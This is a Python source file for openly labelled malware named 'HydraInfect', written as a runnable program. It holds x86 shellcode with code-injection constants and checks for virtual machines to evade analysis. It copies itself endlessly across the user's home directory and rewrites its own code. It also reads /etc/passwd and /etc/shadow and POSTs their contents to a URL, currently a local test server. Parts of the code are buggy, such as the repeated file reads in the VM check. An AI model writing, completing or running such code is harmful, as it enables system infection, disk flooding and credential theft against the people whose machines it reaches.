import os
import platform
import ctypes
import psutil
import shutil
import random
import requests
import time
import winreg


# Constants for code injection (Windows only)
PROCESS_ALL_ACCESS = 0x1F0FFF
VIRTUAL_MEM = (0x1000 | 0x2000)
PAGE_EXECUTE_READWRITE = 0x40

# Shellcode for MessageBoxA (Windows API) in x86 architecture
shellcode = (
    b"\x31\xC9"                  # xor ecx, ecx
    b"\x51"                      # push ecx
    b"\x68\x65\x6C\x6C\x21"      # push 0x216c6c65 ('ell!')
    b"\x68\x4D\x73\x67\x42"      # push 0x4273674d ('MsgB')
    b"\x8B\xC4"                  # mov eax, esp
    b"\x6A\x00"                  # push 0x0 (MB_OK)
    b"\x50"                      # push eax
    b"\xBB\xF0\x04\xE4\x77"      # mov ebx, 0x77E404F0 (address of MessageBoxA)
    b"\xFF\xD3"                  # call ebx
    b"\x31\xC0"                  # xor eax, eax
    b"\x50"                      # push eax
    b"\xC3"                      # ret
)

# 1. Environment Detection (Basic Evasion)

def is_virtual_environment():
    if platform.system() == "Linux":
        # Check for specific virtualization files
        if os.path.exists('/proc/scsi/scsi'):
            with open('/proc/scsi/scsi') as f:
                if 'VMware' in f.read() or 'VirtualBox' in f.read() or 'QEMU' in f.read():
                    return True        
        # Check for DMI entries (BIOS/Hardware info)
        if os.path.exists('/sys/class/dmi/id/product_name'):
            with open('/sys/class/dmi/id/product_name') as f:
                product_name = f.read().strip()
                if 'VirtualBox' in product_name or 'VMware' in product_name or 'QEMU' in product_name:
                    return True
        
        if os.path.exists('/sys/class/dmi/id/sys_vendor'):
            with open('/sys/class/dmi/id/sys_vendor') as f:
                sys_vendor = f.read().strip()
                if 'VirtualBox' in sys_vendor or 'VMware' in sys_vendor or 'QEMU' in sys_vendor:
                    return True
        
        # Check for CPU flags related to virtualization
        try:
            with open('/proc/cpuinfo') as f:
                cpuinfo = f.read()
                if 'hypervisor' in cpuinfo:
                    return True
        except FileNotFoundError:
            pass
        
        # Alternative check using `lshw` if available
        try:
            output = os.popen('lshw -short').read()
            if 'VirtualBox' in output or 'VMware' in output or 'QEMU' in output:
                return True
        except Exception:
            pass

        return False
    
    if platform.system() == "Windows":
        # Check for VirtualBox specific registry entries
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System") as key:
                value, _ = winreg.QueryValueEx(key, "SystemBiosVersion")
                if "VirtualBox" in value:
                    return True
        except FileNotFoundError:
            pass
        
        # Check for VirtualBox specific strings in system information
        try:
            import subprocess
            output = subprocess.check_output("wmic computersystem get model", shell=True).decode()
            if "VirtualBox" in output:
                return True
        except Exception:
            pass
        
        # Check for VirtualBox processes
        virtualbox_processes = ["VirtualBox.exe", "VBoxService.exe", "VBoxTray.exe"]
        for proc in virtualbox_processes:
            try:
                import psutil
                for p in psutil.process_iter(['pid', 'name']):
                    if proc in p.info['name']:
                        return True
            except ImportError:
                print("psutil module is required for process checking")
                return False

        # Check for VirtualBox services
        virtualbox_services = ["VBoxService", "VBoxTray"]
        for service in virtualbox_services:
            try:
                import win32serviceutil
                if win32serviceutil.QueryServiceStatus(service)[1] == win32serviceutil.SERVICE_RUNNING:
                    return True
            except ImportError:
                print("pywin32 module is required for service checking")
                return False
            except Exception:
                pass

        return False
    

    return False
    

# 2. Display Message
def display_message():
    os_type = platform.system()
    if os_type == "Windows":
        ctypes.windll.user32.MessageBoxW(0, "You've been infected by HydraInfect!", "Malware Alert", 1)
    elif os_type == "Darwin":  # macOS
        os.system('osascript -e \'tell app "System Events" to display dialog "You\'ve been infected by HydraInfect!"\'')
    elif os_type == "Linux":
        os.system('zenity --info --text="You\'ve been infected by HydraInfect!"')
    else:
        print("You've been infected by HydraInfect!")  # Fallback for other OSes

# 3. Virus-like Behavior (Self-Replication)

def replicate():
    current_file = __file__
    print(f"Current file path: {current_file}")
    
    target_locations = []

    if platform.system() == "Windows":
        target_path = os.path.join(os.environ["HOMEPATH"], "malware_copy.exe")
        print(f"Target path for Windows: {target_path}")
        target_locations.append(target_path)
    elif platform.system() == "Linux" or platform.system() == "Darwin":
        target_path = os.path.expanduser("~/malware_copy")
        print(f"Target path for Linux/macOS: {target_path}")
        target_locations.append(target_path)

    for target in target_locations:
        print(f"Copying to: {target}")
        shutil.copyfile(current_file, target)

def infinite_replicate():
    current_file = __file__
    target_dir = os.path.expanduser("~")  # Start in the user's home directory

    while True:
        for i in range(10):  # Limit the number of copies per loop to prevent rapid system overload
            target_location = os.path.join(target_dir, f"malware_copy_{random.randint(1000, 9999)}.py")
            shutil.copyfile(current_file, target_location)
            print(f"Copied to {target_location}")

        # Recursively replicate to other directories
        for root, dirs, files in os.walk(target_dir):
            for name in dirs:
                new_target_dir = os.path.join(root, name)
                target_location = os.path.join(new_target_dir, f"malware_copy_{random.randint(1000, 9999)}.py")
                shutil.copyfile(current_file, target_location)
                print(f"Copied to {target_location}")

        # Wait a bit before replicating again to avoid immediate detection
        time.sleep(5)


# 4. Mutation
def mutate():
    with open(__file__, 'r') as f:
        lines = f.readlines()

    mutation_line = random.randint(0, len(lines) - 1)
    lines.insert(mutation_line, f"# Mutation {random.randint(1, 100000)}\n")

    with open(__file__, 'w') as f:
        f.writelines(lines)

# 5. Data Exfiltration

def collect_sensitive_data():
    # Path to files where sensitive data might be stored
    paths = [
        '/etc/passwd',  # Example file, actual sensitive data should not be stored here
        '/etc/shadow',  # Example file for passwords (hashed)
    ]
    
    sensitive_data = ''
    for path in paths:
        if os.path.exists(path):
            with open(path, 'r') as f:
                sensitive_data += f.read()
    
    return sensitive_data


def exfiltrate(data, target_url):
    try:
        response = requests.post(target_url, data={'data': data})
        if response.status_code == 200:
            print("Data exfiltrated successfully")
        else:
            print(f"Failed to exfiltrate data, status code: {response.status_code}")
    except Exception as e:
        print(f"Failed to exfiltrate data: {e}")

# Main function to run the malware
def main():
    print(is_virtual_environment())
    if is_virtual_environment():
        print("Hello")
    else:
        print("not VM")

    replicate()
    infinite_replicate()
    mutate()
    sensitive_data = collect_sensitive_data()
    target_url = "http://localhost:8000"  # Use a local server URL for testing
    exfiltrate(sensitive_data, target_url)
    display_message()


if __name__ == "__main__":
    main()